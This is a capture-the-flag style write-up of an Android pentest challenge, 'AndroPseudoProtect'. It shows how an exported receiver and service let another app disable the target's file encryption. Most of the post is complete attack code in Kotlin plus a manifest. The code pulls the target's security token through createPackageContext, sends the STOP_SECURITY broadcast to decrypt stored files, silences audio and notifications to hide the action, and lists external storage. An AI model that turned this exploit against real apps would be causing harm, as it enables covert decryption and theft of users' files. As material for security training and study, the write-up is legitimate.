---
title: "AndroPseudoProtect - The Ultimate Device Security"
date: 2026-05-25 21:40:00 +0800
categories: [Android]
tags: [Android Pentest, 8ksec, broadcast receiver, exported service, IPC]
---

After installing the app on our Android 16 device, we see a `Start Security` button that encrypts files on external storage. Our goal is to silently disable this encryption and read the decrypted files.

![Landing page of AndroPseudoProtect apk.](/images/AndroPseudoProtect/image.png)

Landing page of AndroPseudoProtect apk.

As the first step of our analysis, we opened the target application in `jadx-gui` and inspected `AndroidManifest.xml`. At a glance, we noticed that the `com.eightksec.andropseudoprotect.SecurityService` service and the `om.eightksec.andropseudoprotect.SecurityReceiver` receiver are exported.

![Exported service and receiver in AndroidManifest.xml](/images/AndroPseudoProtect/image%201.png)

Exported service and receiver in AndroidManifest.xml

Looking into the receiver, it crafts an intent to trigger the service based on the received intent. If we trigger the receiver with certain flags and values, it crafts the intent and starts the service.

![Crafting intent and starting service with that intent.](/images/AndroPseudoProtect/image%202.png)

Crafting intent and starting service with that intent. 

Next, in the `com.eightksec.andropseudoprotect.SecurityService"` service, it validates the `security_token` against the return value of `getSecurityToken`, then branches based on the action, either to `startSecurity()` or `stopSecurity()`.

![SecurityService validating extras and tokens and deciding weather to start or stop security.](/images/AndroPseudoProtect/image%203.png)

SecurityService validating extras and tokens and deciding weather to start or stop security. 

Here, `startSecurity()` encrypts the files on storage, and `stopSecurity()` decrypts those same files.

Since the receiver responsible for triggering the service is exported, any app can start it. The challenge was passing the token without hardcoding it. To do that, we used `createPackageContext` to create an instance of the `SecurityUtils` class and invoke the `getSecurityToken` method from within our own app.

```jsx
fun getToken(context: Context): String? {
    val targetPackage = "com.eightksec.andropseudoprotect"
    return try {
        val andropseudoprotectContext = context.createPackageContext(
            targetPackage,
            Context.CONTEXT_IGNORE_SECURITY or Context.CONTEXT_INCLUDE_CODE
        )
        val classLoader = andropseudoprotectContext.classLoader
        val targetClass = "com.eightksec.andropseudoprotect.SecurityUtils"
        val securityUtilsClass = classLoader.loadClass(targetClass)
        val securityUtilsInstance = securityUtilsClass.getDeclaredConstructor().newInstance()
        val getSecurityTokenMethod = securityUtilsClass.getMethod("getSecurityToken")
        getSecurityTokenMethod.invoke(securityUtilsInstance) as String
    } catch (e: Exception) {
        e.toString()
    }
}
```

Since our goal is to decrypt and read files without notifying the user, we set our app to use `dnd` mode using the `ACCESS_NOTIFICATION_POLICY` policy. As proof of accessibility, we list the decrypted files using the `READ_EXTERNAL_STORAGE` permission.

To trigger the decryption, we send an explicit broadcast with the action `com.eightksec.andropseudoprotect.STOP_SECURITY`, with `security_token` as the extra key.

```jsx
val stopIntent = Intent("com.eightksec.andropseudoprotect.STOP_SECURITY")
stopIntent.putExtra("security_token", secretToken)
stop.setPackage("com.eightksec.andropseudoprotect")
sendBroadcast(stopIntent)
```

![Silently decrypting and stealing the files.](/images/AndroPseudoProtect/image%204.png)

Silently decrypting and stealing the files.

This way, we manage to decrypt and list the files by exploiting the exported broadcast, using dnd mode, and the `createPackageContext` API.

Here is our full code:

```jsx
package com.nirajneupane08.pseudoencryption

import android.Manifest
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material3.Button
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {

    private val externalFilesState = mutableStateOf<List<FileItem>>(emptyList())

    private val storagePermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        if (permissions.values.all { it }) {
            refreshFiles()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        // 1. Silent Mode Logic
        suppressAudioAndVibration()
        suppressNotifications()

        val secretToken = getToken(this) ?: "Error"

        setContent {
            val files by externalFilesState
            val scope = rememberCoroutineScope()
            MaterialTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Greeting(
                        token = secretToken,
                        files = files,
                        onDeactivate = {
                            // 1. Silently Deactivate Security
                            if (secretToken.isNotEmpty() && !secretToken.contains("Error") && !secretToken.contains("Exception")) {
                                val stopIntent = Intent("com.eightksec.andropseudoprotect.STOP_SECURITY")
                                stopIntent.putExtra("security_token", secretToken)
                                stopIntent.setPackage("com.eightksec.andropseudoprotect")
                                sendBroadcast(stopIntent)
                            }

                            // 2. Wait for 5 seconds then list the files
                            scope.launch {
                                delay(5000)
                                checkPermissionsAndRefresh()
                            }
                        },
                        modifier = Modifier.padding(innerPadding)
                    )
                }
            }
        }
    }

    private fun checkPermissionsAndRefresh() {
        val permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO
            )
        } else {
            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        val allGranted = permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }

        if (allGranted) {
            refreshFiles()
        } else {
            storagePermissionLauncher.launch(permissions)
        }
    }

    private fun refreshFiles() {
        externalFilesState.value = listExternalFiles()
    }

    private fun suppressAudioAndVibration() {
        try {
            val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.ringerMode = AudioManager.RINGER_MODE_SILENT
            val streams = listOf(
                AudioManager.STREAM_MUSIC,
                AudioManager.STREAM_NOTIFICATION,
                AudioManager.STREAM_RING,
                AudioManager.STREAM_ALARM,
                AudioManager.STREAM_SYSTEM
            )
            streams.forEach { stream ->
                am.setStreamVolume(stream, 0, 0)
            }
            Log.d("8KSEC_SILENT", "Audio and Vibration suppressed.")
        } catch (e: Exception) {
            Log.e("8KSEC_SILENT", "Failed to suppress audio: ${e.message}")
        }
    }

    private fun suppressNotifications() {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (nm.isNotificationPolicyAccessGranted) {
            nm.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_NONE)
        } else {
            try {
                val intent = Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)
                startActivity(intent)
            } catch (e: Exception) {
                Log.e("8KSEC_SILENT", "Could not open settings: ${e.message}")
            }
        }
    }
}

fun getToken(context: Context): String? {
    val targetPackage = "com.eightksec.andropseudoprotect"
    return try {
        val andropseudoprotectContext = context.createPackageContext(
            targetPackage,
            Context.CONTEXT_IGNORE_SECURITY or Context.CONTEXT_INCLUDE_CODE
        )
        val classLoader = andropseudoprotectContext.classLoader
        val targetClass = "com.eightksec.andropseudoprotect.SecurityUtils"
        val securityUtilsClass = classLoader.loadClass(targetClass)
        val securityUtilsInstance = securityUtilsClass.getDeclaredConstructor().newInstance()
        val getSecurityTokenMethod = securityUtilsClass.getMethod("getSecurityToken")
        getSecurityTokenMethod.invoke(securityUtilsInstance) as String
    } catch (e: Exception) {
        e.toString()
    }
}

@Composable
fun Greeting(
    token: String,
    files: List<FileItem>,
    onDeactivate: () -> Unit,
    modifier: Modifier = Modifier
) {
    Column(
        modifier = modifier.fillMaxSize().padding(16.dp),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text(text = "Extracted Token: $token", style = MaterialTheme.typography.titleMedium)
        Spacer(modifier = Modifier.height(16.dp))
        Button(onClick = onDeactivate) {
            Text("Silently Deactivate Security")
        }
        Spacer(modifier = Modifier.height(24.dp))
        Text(text = "External Files:", style = MaterialTheme.typography.titleSmall)
        if (files.isEmpty()) {
            Text(text = "(Files will appear here after 5s)", style = MaterialTheme.typography.bodySmall)
        }
        LazyColumn(modifier = Modifier.weight(1f)) {
            items(files) { file ->
                Text(
                    text = "${if (file.isDirectory) "[DIR]" else "[FILE]"} ${file.path}",
                    style = MaterialTheme.typography.bodySmall,
                    modifier = Modifier.padding(vertical = 2.dp)
                )
            }
        }
    }
}

```

```jsx
package com.nirajneupane08.pseudoencryption

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Environment
import androidx.core.content.ContextCompat
import java.io.File

data class FileItem(val path: String, val size: Long, val isDirectory: Boolean)

fun listExternalFiles(): List<FileItem> {
    val results = mutableListOf<FileItem>()
    val root = Environment.getExternalStorageDirectory()
    walkDir(root, results)
    return results
}

private fun walkDir(dir: File, results: MutableList<FileItem>) {
    dir.listFiles()?.forEach { file ->
        results.add(FileItem(file.absolutePath, file.length(), file.isDirectory))
        if (file.isDirectory) {
            walkDir(file, results)
        }
    }
}

fun hasStoragePermission(context: Context): Boolean {
    return ContextCompat.checkSelfPermission(
        context,
        Manifest.permission.READ_EXTERNAL_STORAGE
    ) == PackageManager.PERMISSION_GRANTED
}
```

```jsx
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">
    <queries>
        <package android:name="com.eightksec.andropseudoprotect" />
    </queries>
    <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
    <application
        android:allowBackup="true"
        android:dataExtractionRules="@xml/data_extraction_rules"
        android:fullBackupContent="@xml/backup_rules"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.PseudoEncryptionSolution8ksec">
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:label="@string/app_name"
            android:theme="@style/Theme.PseudoEncryptionSolution8ksec">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

</manifest>
```
